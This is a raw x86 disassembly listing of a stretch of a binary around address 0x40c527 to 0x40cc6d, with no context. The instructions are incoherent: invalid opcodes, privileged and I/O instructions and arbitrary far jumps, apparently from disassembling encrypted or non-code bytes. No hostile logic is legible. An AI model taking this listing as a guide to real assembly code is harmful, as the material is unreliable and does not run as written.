  40c527:	sar    edx,cl
  40c529:	nop
  40c52a:	stos   BYTE PTR es:[edi],al
  40c52b:	mov    edx,esi
  40c52d:	mov    edx,0x7a1af557
  40c532:	mov    edx,ebx
  40c534:	dec    edx
  40c535:	lds    ebp,FWORD PTR [ebp-0x66d6860e]
  40c53b:	scas   eax,DWORD PTR es:[edi]
  40c53c:	loope  0x40c599
  40c53e:	push   edi
  40c53f:	mov    ch,0xf0
  40c541:	ss jmp 0x18cbf3a7
  40c547:	lea    esp,[ecx+0x68b956a5]
  40c54d:	pop    edi
  40c54e:	xchg   ebp,eax
  40c54f:	loopne 0x40c54c
  40c551:	push   edi
  40c552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c553:	xchg   edx,eax
  40c554:	(bad)  
  40c555:	cmc    
  40c556:	lea    esi,[ecx+0x5d]
  40c559:	mov    ebp,0x62fe791c
  40c55e:	rcr    BYTE PTR [edx-0x5f1f3522],0xdc
  40c565:	sbb    ch,BYTE PTR [esi]
  40c567:	ffree  st(3)
  40c569:	mov    ah,BYTE PTR [eax+0x7f39767e]
  40c56f:	in     eax,0x9f
  40c571:	int3   
  40c572:	inc    edi
  40c573:	out    0xdc,ax
  40c576:	mov    ebp,0xa767c007
  40c57b:	mov    eax,ds:0x453ed997
  40c580:	jmp    0x459ffd69
  40c585:	inc    edx
  40c586:	sbb    BYTE PTR cs:[edi],ch
  40c589:	sub    al,0xdc
  40c58b:	lods   al,BYTE PTR ss:[esi]
  40c58d:	cmp    BYTE PTR [eax],0x3a
  40c590:	adc    esp,DWORD PTR [esi]
  40c592:	daa    
  40c593:	adc    BYTE PTR [esi+0x5e],cl
  40c596:	adc    eax,0xdcc029cc
  40c59b:	rcl    BYTE PTR [eax],0xee
  40c59e:	test   DWORD PTR [ebx+0x526061f6],ebp
  40c5a4:	sbb    dl,BYTE PTR [eax+ecx*4]
  40c5a7:	scas   eax,DWORD PTR es:[edi]
  40c5a8:	pop    edi
  40c5a9:	sbb    al,0xdf
  40c5ab:	in     eax,0x87
  40c5ad:	sbb    dl,BYTE PTR [ebx]
  40c5af:	ror    BYTE PTR [esi-0x60],1
  40c5b2:	mov    ds:0x6836ff65,al
  40c5b7:	jb     0x40c5ec
  40c5b9:	dec    ebx
  40c5ba:	or     eax,0x2dcd7b65
  40c5bf:	lds    esi,FWORD PTR [eax-0xe443bd8]
  40c5c5:	repnz xor al,0x45
  40c5c8:	imul   edx,DWORD PTR [ecx+0x32],0xffffff98
  40c5cc:	xor    al,0x1b
  40c5ce:	adc    eax,0xb7d2a461
  40c5d3:	add    BYTE PTR [esi-0x7ba615d3],dh
  40c5d9:	add    DWORD PTR [ecx-0xe],edx
  40c5dc:	data16 mov bl,0x1e
  40c5df:	and    eax,0x31f17cc7
  40c5e4:	sub    eax,0xbd26f845
  40c5e9:	push   eax
  40c5ea:	sbb    eax,esp
  40c5ec:	loop   0x40c582
  40c5ee:	hlt    
  40c5ef:	mov    ecx,0x3bdbec01
  40c5f4:	iret   
  40c5f5:	or     bh,ah
  40c5f7:	frstor [ecx-0x5cd39591]
  40c5fd:	cmp    DWORD PTR cs:[edx+0x5215fcb9],ebp
  40c604:	jne    0x40c5ce
  40c606:	cmp    eax,DWORD PTR [esi+esi*1-0x12]
  40c60a:	ficom  DWORD PTR [ebx]
  40c60c:	idiv   BYTE PTR [ebp-0x6e]
  40c60f:	mov    ebx,0xb25e4b0d
  40c614:	mov    cl,0x8e
  40c616:	stos   BYTE PTR es:[edi],al
  40c617:	inc    edx
  40c618:	test   BYTE PTR [edi+0x50a92809],ah
  40c61e:	ret    0x790a
  40c621:	and    eax,0x4bb5c1b4
  40c626:	das    
  40c627:	pusha  
  40c628:	jne    0x40c5de
  40c62a:	pop    ebp
  40c62b:	push   ds
  40c62c:	fdivr  QWORD PTR [ecx-0x38]
  40c62f:	lods   al,BYTE PTR ds:[esi]
  40c630:	push   0x72357c3f
  40c635:	hlt    
  40c636:	nop
  40c637:	cmp    DWORD PTR [ebp+0x19],edx
  40c63a:	mov    ds:0x61b96726,al
  40c63f:	cmp    esi,DWORD PTR [ebx-0x783a720b]
  40c645:	mov    al,ds:0x93711727
  40c64a:	sub    dh,bl
  40c64c:	jmp    0x35f7:0xe31f3be1
  40c653:	and    bl,BYTE PTR ds:0xe52716f0
  40c659:	xchg   DWORD PTR [esi-0x7c],ecx
  40c65c:	cmp    DWORD PTR [esp+ebp*8],edx
  40c65f:	mov    ebx,0xd4ab3f80
  40c664:	into   
  40c665:	in     al,0x59
  40c667:	mov    al,0x59
  40c669:	and    edi,ecx
  40c66b:	jne    0x40c6d4
  40c66d:	lahf   
  40c66e:	mov    esp,0xc108a4af
  40c673:	je     0x40c62d
  40c675:	mov    edi,0xc2d14a69
  40c67a:	pop    ebx
  40c67b:	hlt    
  40c67c:	test   eax,0x390c08ae
  40c681:	jmp    DWORD PTR [esi+0x3e8287fb]
  40c687:	xor    ebp,DWORD PTR [ecx-0x28]
  40c68a:	jb     0x40c612
  40c68c:	aam    0x2c
  40c68e:	jne    0x40c6dc
  40c690:	addr16 inc esp
  40c692:	iret   
  40c693:	xchg   BYTE PTR [ecx+edi*4+0x1],cl
  40c697:	shr    ebp,0xe5
  40c69a:	rcl    DWORD PTR [ecx+0x72],1
  40c69d:	ins    DWORD PTR es:[edi],dx
  40c69e:	sbb    DWORD PTR [ecx],ebx
  40c6a0:	mov    BYTE PTR [edx+0x31a95db7],ch
  40c6a6:	sub    al,0x6c
  40c6a8:	jbe    0x40c6af
  40c6aa:	addr16 loopne 0x40c6b7
  40c6ad:	icebp  
  40c6ae:	scas   al,BYTE PTR es:[edi]
  40c6af:	mov    ds:0x2f67b652,eax
  40c6b4:	stc    
  40c6b5:	push   ecx
  40c6b6:	imul   ebp,DWORD PTR [ebp-0x51d554c6],0x2b
  40c6bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6be:	mov    edx,0xfdd8007f
  40c6c3:	int3   
  40c6c4:	pop    edx
  40c6c5:	cmp    BYTE PTR [ecx+0x14],dl
  40c6c8:	mov    esi,0xc402da7c
  40c6cd:	or     al,0x36
  40c6cf:	push   0x30afd562
  40c6d4:	aad    0x96
  40c6d6:	cmp    BYTE PTR [esi-0x72c6d169],dl
  40c6dc:	in     al,dx
  40c6dd:	mov    al,ds:0xa19c3f67
  40c6e2:	xor    ebx,esi
  40c6e4:	xlat   BYTE PTR ds:[ebx]
  40c6e5:	pop    esi
  40c6e6:	or     esp,ebp
  40c6e8:	xchg   ecx,eax
  40c6e9:	push   ecx
  40c6ea:	xor    ecx,DWORD PTR [esi+eax*2]
  40c6ed:	test   eax,0xf5957e7c
  40c6f2:	pop    eax
  40c6f3:	adc    al,0xfd
  40c6f5:	adc    DWORD PTR [ebx+ebp*8+0x1bbd09ed],ebx
  40c6fc:	jmp    0x40c69b
  40c6fe:	xor    eax,0xcf666fbf
  40c703:	call   0xd48b96c5
  40c708:	or     al,0x80
  40c70a:	retf   0xc483
  40c70d:	mov    esp,0xf146778b
  40c712:	js     0x40c6ee
  40c714:	lahf   
  40c715:	inc    edx
  40c716:	pop    es
  40c717:	out    dx,eax
  40c718:	popa   
  40c719:	xlat   BYTE PTR ds:[ebx]
  40c71a:	push   ebx
  40c71b:	push   edx
  40c71c:	fs push edi
  40c71e:	popa   
  40c71f:	or     DWORD PTR [ebp+edx*1-0x34],0x32d41913
  40c727:	inc    ebp
  40c728:	jae    0x40c728
  40c72a:	sbb    BYTE PTR [edx],al
  40c72c:	jmp    0xc78ee728
  40c731:	icebp  
  40c732:	mov    bl,0xfa
  40c734:	sahf   
  40c735:	xchg   esi,eax
  40c736:	dec    edx
  40c737:	cld    
  40c738:	retf   
  40c739:	je     0x40c792
  40c73b:	(bad)  
  40c73c:	mov    dh,0x8
  40c73e:	push   ebx
  40c73f:	cmp    BYTE PTR [esi+0x141ce741],ah
  40c745:	jae    0x40c760
  40c747:	jns    0x40c727
  40c749:	out    0x66,eax
  40c74b:	pop    edi
  40c74c:	push   cs
  40c74d:	mov    ebx,0xc1e8f7e8
  40c752:	add    edx,eax
  40c754:	out    dx,eax
  40c755:	ret    0x6706
  40c758:	xchg   ebx,eax
  40c759:	enter  0xcdeb,0x47
  40c75d:	call   0x7fb77662
  40c762:	cmp    edx,ebp
  40c764:	pop    es
  40c765:	pop    es
  40c766:	retf   
  40c767:	mov    edx,0x8e9c33c
  40c76c:	test   eax,0xb2b85649
  40c771:	jle    0x40c7d4
  40c773:	add    BYTE PTR [eax],al
  40c775:	mov    DWORD PTR [ecx],eax
  40c777:	out    0x14,eax
  40c779:	test   ebx,esi
  40c77b:	pusha  
  40c77c:	and    eax,0xe38366d1
  40c781:	jns    0x40c725
  40c783:	aad    0x79
  40c785:	inc    ebp
  40c786:	xlat   BYTE PTR ds:[ebx]
  40c787:	pop    ds
  40c788:	jmp    edx
  40c78a:	test   eax,0x9cb404c3
  40c78f:	inc    edx
  40c790:	jmp    FWORD PTR [eax+0x79acfa8f]
  40c796:	lods   eax,DWORD PTR ds:[esi]
  40c797:	dec    ecx
  40c798:	sar    BYTE PTR [ebp-0xb5556c0],1
  40c79e:	xchg   edi,eax
  40c79f:	xor    bl,bh
  40c7a1:	fabs   
  40c7a3:	cmp    DWORD PTR [eax-0x52],esi
  40c7a6:	xchg   esi,eax
  40c7a7:	inc    ecx
  40c7a8:	and    edi,DWORD PTR [eax-0x4feea250]
  40c7ae:	inc    edx
  40c7af:	sbb    bl,bl
  40c7b1:	mov    esp,ecx
  40c7b3:	arpl   WORD PTR [edx],sp
  40c7b5:	lods   eax,DWORD PTR ds:[esi]
  40c7b6:	mov    es,WORD PTR [ebx+0x26d73119]
  40c7bc:	mov    al,0xe3
  40c7be:	cdq    
  40c7bf:	dec    edx
  40c7c0:	pop    es
  40c7c1:	xor    ebx,DWORD PTR [edi]
  40c7c3:	retf   
  40c7c4:	or     BYTE PTR [ecx+0x383fb136],al
  40c7ca:	mov    ah,0xd2
  40c7cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7cd:	xchg   edi,eax
  40c7ce:	test   BYTE PTR [ebx+0x3a],dh
  40c7d1:	test   BYTE PTR [edx],dl
  40c7d3:	cli    
  40c7d4:	es mov ch,0x38
  40c7d7:	jge    0x40c7ca
  40c7d9:	or     dl,bl
  40c7db:	call   0x1503ca0c
  40c7e0:	mov    al,0x82
  40c7e2:	test   eax,0x7a49b469
  40c7e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7e8:	mov    bh,0x7c
  40c7ea:	arpl   di,dx
  40c7ec:	aaa    
  40c7ed:	mov    bh,0x35
  40c7ef:	enter  0xd00f,0x38
  40c7f3:	sti    
  40c7f4:	aaa    
  40c7f5:	clc    
  40c7f6:	pop    ecx
  40c7f7:	cmp    al,0xb1
  40c7f9:	jbe    0x40c790
  40c7fb:	xchg   esi,eax
  40c7fc:	fcomp  DWORD PTR ss:[ebx]
  40c7ff:	lahf   
  40c800:	loopne 0x40c7c9
  40c802:	sub    al,dh
  40c804:	jae    0x40c83c
  40c806:	mov    esi,0xcea6a4d0
  40c80b:	test   edi,0xa0fe7406
  40c811:	adc    ch,al
  40c813:	mov    ds:0x76a70226,eax
  40c818:	pushf  
  40c819:	mov    eax,0x65dc0415
  40c81e:	mov    cs,ebx
  40c820:	in     eax,dx
  40c821:	neg    dh
  40c823:	sbb    al,0x2e
  40c825:	jge    0x40c85c
  40c827:	lahf   
  40c828:	gs cmp eax,0xb1ff8af
  40c82f:	gs (bad) 
  40c831:	js     0x40c865
  40c833:	es rcl dh,0x82
  40c837:	ret    0xce2b
  40c83a:	mov    ebx,DWORD PTR [eax+0x6b20e983]
  40c840:	inc    edi
  40c841:	clc    
  40c842:	push   edi
  40c843:	jno    0x40c863
  40c845:	(bad)  
  40c846:	adc    al,0xc2
  40c848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c849:	or     DWORD PTR [ecx-0x11],esp
  40c84c:	scas   al,BYTE PTR es:[edi]
  40c84d:	mov    bh,0xee
  40c84f:	xchg   ecx,eax
  40c850:	cmp    al,0x0
  40c852:	mov    ah,0x84
  40c854:	ins    DWORD PTR es:[edi],dx
  40c855:	les    edx,FWORD PTR [ebp+0x6918b0b9]
  40c85b:	out    dx,al
  40c85c:	and    esp,edi
  40c85e:	outs   dx,BYTE PTR ds:[esi]
  40c85f:	imul   edx,esi,0xffffffa4
  40c862:	cdq    
  40c863:	fld    DWORD PTR [eax+eiz*4]
  40c866:	retf   0x9d41
  40c869:	jp     0x40c879
  40c86b:	imul   esi,DWORD PTR [ecx],0x1cbd1c9f
  40c871:	retf   
  40c872:	jb     0x40c800
  40c874:	rcl    DWORD PTR [esi],1
  40c876:	or     DWORD PTR [esi+0x6b],ecx
  40c879:	lahf   
  40c87a:	in     al,0x7a
  40c87c:	inc    eax
  40c87d:	ret    0x8616
  40c880:	sub    al,0x9e
  40c882:	ds xor eax,0x8b6233a0
  40c888:	out    0xb0,al
  40c88a:	pop    edi
  40c88b:	aaa    
  40c88c:	and    DWORD PTR [eax],0x61b3bc19
  40c892:	sub    eax,0x47b68743
  40c897:	mov    al,BYTE PTR [esi]
  40c899:	xor    DWORD PTR [ecx-0x6c],0xfffffffc
  40c89d:	mov    ds:0x3c375e0f,eax
  40c8a2:	ficomp DWORD PTR [ebx+0x68]
  40c8a5:	ret    
  40c8a6:	adc    ebp,DWORD PTR [ebp-0x370106a7]
  40c8ac:	bound  ebx,QWORD PTR [edi]
  40c8ae:	xchg   ebp,eax
  40c8af:	(bad)  
  40c8b0:	stos   DWORD PTR es:[edi],eax
  40c8b1:	aad    0x37
  40c8b3:	jg     0x40c8a1
  40c8b5:	bound  ebp,QWORD PTR [ebx-0x42]
  40c8b8:	retf   
  40c8b9:	or     eax,0x682f1cbd
  40c8be:	ins    BYTE PTR es:[edi],dx
  40c8bf:	sub    BYTE PTR [eax+0x27aae9cf],al
  40c8c5:	and    al,0x1b
  40c8c7:	das    
  40c8c8:	add    esp,DWORD PTR [esi+0x3e]
  40c8cb:	mov    edx,0x4a2d811a
  40c8d0:	xchg   esi,eax
  40c8d1:	repnz cmp al,0x28
  40c8d4:	mov    ecx,0xddc599d1
  40c8da:	retf   0x892c
  40c8dd:	mov    ?,WORD PTR [edi]
  40c8df:	adc    DWORD PTR [eax-0x73160452],edi
  40c8e5:	sbb    BYTE PTR [esi+0x17],0xd3
  40c8e9:	and    al,0xd3
  40c8eb:	mov    esi,DWORD PTR gs:[ebp+0x31]
  40c8ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8f0:	jmp    0x6b1d:0xee201d9f
  40c8f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f8:	pop    esi
  40c8f9:	test   al,0x85
  40c8fb:	jnp    0x40c93c
  40c8fd:	mov    bl,bh
  40c8ff:	stc    
  40c900:	aas    
  40c901:	or     al,0x19
  40c903:	cmp    al,0xfd
  40c905:	js     0x40c928
  40c907:	adc    dl,BYTE PTR [edi]
  40c909:	(bad)  
  40c90a:	cmp    eax,DWORD PTR [ebp+0x19]
  40c90d:	mov    bl,0x61
  40c90f:	lods   eax,DWORD PTR ds:[esi]
  40c910:	adc    cl,0x2b
  40c913:	in     eax,dx
  40c914:	adc    eax,0x1112ec5d
  40c919:	loopne 0x40c8ac
  40c91b:	out    0x34,al
  40c91d:	mov    bh,0x53
  40c91f:	fwait
  40c920:	test   ecx,esp
  40c922:	mov    edx,0xa1269843
  40c927:	cwde   
  40c928:	sub    bl,BYTE PTR [ebx-0x69]
  40c92b:	sbb    eax,0x82d50a14
  40c930:	stos   BYTE PTR es:[edi],al
  40c931:	jne    0x40c944
  40c933:	sbb    BYTE PTR [edx],al
  40c935:	push   ds
  40c936:	add    eax,edi
  40c938:	cmc    
  40c939:	(bad)  
  40c93a:	sub    ch,bl
  40c93c:	mov    eax,0xd68cec68
  40c941:	sbb    al,0x32
  40c943:	pop    esp
  40c944:	or     bh,bl
  40c946:	or     BYTE PTR [ebp+eiz*4+0x2588e49],0x97
  40c94e:	popa   
  40c94f:	jnp    0x40c96e
  40c951:	cmc    
  40c952:	cmc    
  40c953:	retf   
  40c954:	pusha  
  40c955:	mov    DWORD PTR [eax+0x1643007d],edi
  40c95b:	and    DWORD PTR [ebp-0x4d],eax
  40c95e:	lods   eax,DWORD PTR ds:[esi]
  40c95f:	lods   al,BYTE PTR ds:[esi]
  40c960:	sbb    DWORD PTR [ebp+0x2f],ebx
  40c963:	outs   dx,DWORD PTR ds:[esi]
  40c964:	stos   DWORD PTR es:[edi],eax
  40c965:	shr    DWORD PTR [edx+eax*1-0x5a308c],cl
  40c96c:	int    0x1e
  40c96e:	push   esp
  40c96f:	arpl   WORD PTR [esi-0x25],dx
  40c972:	or     al,cl
  40c974:	mov    BYTE PTR [ebx],ch
  40c976:	out    dx,eax
  40c977:	ror    ah,1
  40c979:	mov    ah,0xc8
  40c97b:	adc    DWORD PTR [edi+ecx*8+0x6e30a891],ebp
  40c982:	sub    ebx,edi
  40c984:	sub    BYTE PTR [eax],bh
  40c986:	(bad)  
  40c987:	cmc    
  40c988:	inc    esi
  40c989:	sbb    ebp,DWORD PTR [ebp+0x2008abe4]
  40c98f:	leave  
  40c990:	ja     0x40c9b4
  40c992:	retf   
  40c993:	push   eax
  40c994:	fdiv   DWORD PTR [edx]
  40c996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c997:	mov    bh,0x2
  40c999:	or     al,0xaf
  40c99b:	int    0x25
  40c99d:	xlat   BYTE PTR ds:[ebx]
  40c99e:	xchg   esi,eax
  40c99f:	inc    ebp
  40c9a0:	pop    ebp
  40c9a1:	nop
  40c9a2:	and    edi,eax
  40c9a4:	push   ds
  40c9a5:	icebp  
  40c9a6:	dec    ecx
  40c9a7:	dec    ebp
  40c9a8:	pop    edx
  40c9a9:	lock xchg esi,eax
  40c9ab:	loope  0x40c9c5
  40c9ad:	dec    edx
  40c9ae:	mov    esi,0x30aec4dc
  40c9b3:	inc    ebp
  40c9b4:	adc    esi,DWORD PTR [eax+0x12]
  40c9b7:	jg     0x40ca2a
  40c9b9:	mov    dl,0x7d
  40c9bb:	pusha  
  40c9bc:	dec    esi
  40c9bd:	aad    0x4a
  40c9bf:	mov    esp,0x8ef4818f
  40c9c4:	xchg   esi,eax
  40c9c5:	and    eax,0xb4530e1d
  40c9ca:	dec    esp
  40c9cb:	sbb    BYTE PTR ds:0xa78a3e38,0x75
  40c9d2:	adc    dh,BYTE PTR ds:0xd5bea268
  40c9d8:	xor    DWORD PTR [ecx+0x3715d4d6],edi
  40c9de:	jecxz  0x40c9ef
  40c9e0:	push   esi
  40c9e1:	shl    BYTE PTR [ecx+0x6b],0x92
  40c9e5:	add    dl,BYTE PTR [esi]
  40c9e7:	inc    esp
  40c9e8:	test   eax,ebp
  40c9ea:	xchg   edx,eax
  40c9eb:	cmp    BYTE PTR [ecx+eiz*1-0x3fec05db],0xf3
  40c9f3:	cmp    dh,ah
  40c9f5:	adc    BYTE PTR [ecx-0x6d4ddd06],cl
  40c9fb:	xor    eax,0xcd5e09f3
  40ca00:	inc    eax
  40ca01:	aas    
  40ca02:	ds xchg edx,eax
  40ca04:	mov    edi,0x206f755f
  40ca09:	pop    esi
  40ca0a:	call   0x7068aa5c
  40ca0f:	mov    edx,0xcf3b0910
  40ca14:	mov    ah,0xcc
  40ca16:	xor    al,0x5e
  40ca18:	mov    cl,0x62
  40ca1a:	add    eax,0xf98d7e6
  40ca1f:	or     al,BYTE PTR [eax+0x1c]
  40ca22:	xor    eax,0x55bf92eb
  40ca27:	sahf   
  40ca28:	iret   
  40ca29:	outs   dx,BYTE PTR ds:[esi]
  40ca2a:	pop    esi
  40ca2b:	xor    bh,BYTE PTR [ebp-0x52]
  40ca2e:	jbe    0x40ca09
  40ca30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca31:	icebp  
  40ca32:	mov    al,ds:0x6cb3babf
  40ca37:	push   ds
  40ca38:	(bad)  
  40ca39:	dec    edi
  40ca3a:	add    al,0xbe
  40ca3c:	pop    ebp
  40ca3d:	jmp    0x40ca64
  40ca3f:	pushf  
  40ca40:	(bad)  
  40ca42:	sbb    ebp,ebx
  40ca44:	pusha  
  40ca45:	int3   
  40ca46:	mov    al,ds:0xf946a973
  40ca4b:	cmp    eax,0x5ad837cb
  40ca50:	or     bh,BYTE PTR [eax]
  40ca52:	xor    ch,BYTE PTR [edi]
  40ca54:	and    eax,0x2343a839
  40ca59:	sti    
  40ca5a:	ins    DWORD PTR es:[edi],dx
  40ca5b:	xchg   esi,eax
  40ca5c:	retf   
  40ca5d:	add    al,0xcd
  40ca5f:	add    BYTE PTR [eax*8-0x625598f4],ah
  40ca66:	xchg   BYTE PTR [ebp-0x6987ca3d],cl
  40ca6c:	jbe    0x40c9ef
  40ca6e:	adc    esp,esi
  40ca70:	shl    edx,1
  40ca72:	sub    BYTE PTR [eax-0x65],al
  40ca75:	jne    0x40caa7
  40ca77:	ins    BYTE PTR es:[edi],dx
  40ca78:	push   ds
  40ca79:	test   esi,ebx
  40ca7b:	call   0xd57397c9
  40ca80:	sbb    bl,ah
  40ca82:	jl     0x40ca46
  40ca84:	or     al,0x30
  40ca86:	push   edx
  40ca87:	and    DWORD PTR [eax],0xffffffbe
  40ca8a:	push   edi
  40ca8b:	ins    DWORD PTR es:[edi],dx
  40ca8c:	adc    al,0x64
  40ca8e:	dec    ecx
  40ca8f:	dec    edx
  40ca90:	adc    bh,dl
  40ca92:	jnp    0x40ca5a
  40ca94:	mov    esi,0xb0627e10
  40ca99:	outs   dx,BYTE PTR ds:[esi]
  40ca9a:	jae    0x40cb04
  40ca9c:	sbb    ebx,DWORD PTR [ebx+0x71]
  40ca9f:	mov    ?,WORD PTR [eax+esi*1-0x698d70d]
  40caa6:	dec    ebx
  40caa7:	daa    
  40caa8:	dec    edi
  40caa9:	or     BYTE PTR [esi],bl
  40caab:	jecxz  0x40ca85
  40caad:	jns    0x40caf3
  40caaf:	lods   eax,DWORD PTR ds:[esi]
  40cab0:	mov    al,0xb6
  40cab2:	pop    es
  40cab3:	inc    DWORD PTR [ebx-0x164fbba2]
  40cab9:	sbb    al,0x75
  40cabb:	push   edi
  40cabc:	mov    ch,0xa2
  40cabe:	inc    esp
  40cabf:	xchg   ebp,eax
  40cac0:	push   ebp
  40cac1:	repz mov ebx,0xc579bde7
  40cac7:	scas   al,BYTE PTR es:[edi]
  40cac8:	dec    eax
  40cac9:	and    al,0xc4
  40cacb:	sbb    eax,0x8be5b3c5
  40cad0:	sbb    DWORD PTR [eax-0x53],ebp
  40cad3:	popf   
  40cad4:	mov    ah,0x53
  40cad6:	xlat   BYTE PTR ds:[ebx]
  40cad7:	mov    ebp,DWORD PTR [edi+ebp*4-0x466e274b]
  40cade:	stos   BYTE PTR es:[edi],al
  40cadf:	faddp  st(6),st
  40cae1:	ror    BYTE PTR [ecx],0x7b
  40cae4:	ret    
  40cae5:	fs sahf 
  40cae7:	add    DWORD PTR [ebx],0x2fe645d3
  40caed:	pop    edx
  40caee:	pushf  
  40caef:	pop    ss
  40caf0:	dec    ebx
  40caf1:	mov    BYTE PTR [edx+0x1a59c60],0xc5
  40caf8:	xchg   ebx,eax
  40caf9:	mov    ds:0x3f161035,al
  40cafe:	lods   al,BYTE PTR ds:[esi]
  40caff:	test   eax,0xa0c5b373
  40cb04:	out    0x57,al
  40cb06:	adc    DWORD PTR [esi-0x45],0xffffff83
  40cb0a:	and    ebx,DWORD PTR [edi+0x691ea4f2]
  40cb10:	je     0x40cb07
  40cb12:	jnp    0x40caf4
  40cb14:	mov    ebx,0xe4c16f37
  40cb19:	popa   
  40cb1a:	pop    edi
  40cb1b:	arpl   WORD PTR [eax-0x6b],ax
  40cb1e:	and    bh,BYTE PTR [ebp+0x7b8ff01c]
  40cb24:	pop    es
  40cb25:	retf   
  40cb26:	jbe    0x40cb7d
  40cb28:	(bad)  
  40cb2a:	xlat   BYTE PTR ds:[ebx]
  40cb2b:	inc    esp
  40cb2c:	aad    0x8e
  40cb2e:	dec    ebp
  40cb2f:	mov    dh,0xb5
  40cb31:	jp     0x40cac4
  40cb33:	mov    ebp,0x6203ef69
  40cb38:	cmp    esp,DWORD PTR [edx-0x46]
  40cb3b:	jge    0x40cae3
  40cb3d:	pop    esi
  40cb3e:	and    al,0xc2
  40cb40:	push   edi
  40cb41:	ds js  0x40cb27
  40cb44:	aam    0x6c
  40cb46:	sbb    BYTE PTR [esi],dh
  40cb48:	leave  
  40cb49:	gs daa 
  40cb4b:	pushf  
  40cb4c:	inc    ebx
  40cb4d:	adc    ebp,edi
  40cb4f:	cmc    
  40cb50:	out    0x33,eax
  40cb52:	push   ebx
  40cb53:	mov    ebx,0x43a7b0f3
  40cb58:	adc    al,BYTE PTR [ebp+0x44]
  40cb5b:	mov    ch,0xe3
  40cb5d:	sbb    dh,BYTE PTR [ecx+0x16]
  40cb60:	mov    cs,WORD PTR [ecx+0x7bce3d99]
  40cb66:	xchg   esi,eax
  40cb67:	mov    esp,0xada54222
  40cb6c:	mov    cl,0x2c
  40cb6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb6f:	push   esp
  40cb70:	pop    ebx
  40cb71:	jmp    0x4514:0x2bf966bc
  40cb78:	cmp    eax,0x67b1dbbe
  40cb7d:	popa   
  40cb7e:	ds or  al,0xa
  40cb81:	jg     0x40cbb2
  40cb83:	adc    eax,0x59a37873
  40cb88:	inc    esi
  40cb89:	sub    al,0x30
  40cb8b:	xor    DWORD PTR [edi+0x4752e22f],ecx
  40cb91:	or     dh,BYTE PTR [ecx-0x4c]
  40cb94:	mov    eax,0xc0aeaaeb
  40cb99:	dec    eax
  40cb9a:	fidiv  WORD PTR [ecx]
  40cb9c:	mov    ebp,0x71756491
  40cba1:	push   esi
  40cba2:	cwde   
  40cba3:	pushf  
  40cba4:	mov    WORD PTR [ebx-0x46d32307],ss
  40cbaa:	int3   
  40cbab:	inc    edi
  40cbac:	mov    al,0x58
  40cbae:	xchg   BYTE PTR [ecx],dl
  40cbb0:	inc    edx
  40cbb1:	xchg   esp,eax
  40cbb2:	mov    BYTE PTR [eax],al
  40cbb4:	rdmsr  
  40cbb6:	aaa    
  40cbb7:	and    bl,dl
  40cbb9:	leave  
  40cbba:	adc    eax,0xadc850f5
  40cbbf:	and    BYTE PTR [edx],cl
  40cbc1:	(bad)  
  40cbc2:	out    dx,al
  40cbc3:	clc    
  40cbc4:	out    dx,eax
  40cbc5:	js     0x40cbe5
  40cbc7:	ins    BYTE PTR es:[edi],dx
  40cbc8:	pop    ebp
  40cbc9:	retf   0xf6c4
  40cbcc:	adc    ebp,ebx
  40cbce:	sbb    al,ch
  40cbd0:	jnp    0x40cc28
  40cbd2:	inc    ecx
  40cbd3:	cmp    cl,bh
  40cbd5:	adc    eax,0x54b643f1
  40cbda:	lods   eax,DWORD PTR ds:[esi]
  40cbdb:	test   al,0x1b
  40cbdd:	xor    al,BYTE PTR [ebp+0x34]
  40cbe0:	mov    DWORD PTR [eax],ebx
  40cbe2:	jg     0x40cc53
  40cbe4:	cmp    dl,BYTE PTR [esi+ecx*2-0x3a]
  40cbe8:	js     0x40cb6e
  40cbea:	popa   
  40cbeb:	ss pop edx
  40cbed:	jb     0x40cc55
  40cbef:	and    esi,DWORD PTR [ebp+0x6a]
  40cbf2:	sub    esi,DWORD PTR [edi]
  40cbf4:	inc    edi
  40cbf5:	rcl    DWORD PTR ds:0x28960079,cl
  40cbfb:	pop    ss
  40cbfc:	xor    BYTE PTR [ecx-0x3afa177c],dl
  40cc02:	jns    0x40cbd7
  40cc04:	dec    edi
  40cc05:	cwde   
  40cc06:	lods   al,BYTE PTR ds:[esi]
  40cc07:	(bad)  
  40cc08:	int    0x16
  40cc0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc0b:	or     ebp,ecx
  40cc0d:	mov    al,al
  40cc0f:	jae    0x40cc27
  40cc11:	cmp    ecx,DWORD PTR [ecx+0x40]
  40cc14:	pop    edx
  40cc15:	jno    0x40cbd9
  40cc17:	inc    esi
  40cc18:	mov    fs,WORD PTR [eax+ebx*2]
  40cc1b:	push   ecx
  40cc1c:	popa   
  40cc1d:	add    dl,BYTE PTR [edx]
  40cc1f:	into   
  40cc20:	scas   al,BYTE PTR es:[edi]
  40cc21:	aaa    
  40cc22:	test   al,dl
  40cc24:	jp     0x40cc74
  40cc26:	shl    DWORD PTR [edx+0x35],cl
  40cc29:	scas   eax,DWORD PTR es:[edi]
  40cc2a:	aaa    
  40cc2b:	or     eax,0xc0051786
  40cc30:	stos   BYTE PTR es:[edi],al
  40cc31:	out    0xab,eax
  40cc33:	mov    esp,0xc8dde11
  40cc38:	xlat   BYTE PTR ds:[ebx]
  40cc39:	mov    bh,0x51
  40cc3b:	adc    BYTE PTR [edx+0x48],0x4d
  40cc3f:	pop    esi
  40cc40:	inc    eax
  40cc41:	imul   ecx,eax,0xffffff8c
  40cc44:	mov    eax,ds:0xd863f0d2
  40cc49:	xor    DWORD PTR [ebx],edx
  40cc4b:	add    eax,0x43d4110
  40cc50:	into   
  40cc51:	push   ebx
  40cc52:	sub    ah,BYTE PTR [ebx+0x34]
  40cc55:	pop    ds
  40cc56:	add    BYTE PTR [ecx-0x54578954],ah
  40cc5c:	ja     0x40cc7c
  40cc5e:	(bad)  
  40cc5f:	push   0xffffff9d
  40cc61:	mov    ds:0x106de17b,al
  40cc66:	repnz mov eax,0xd10b3fc7
  40cc6c:	xchg   esi,eax
  40cc6d:	(bad)  
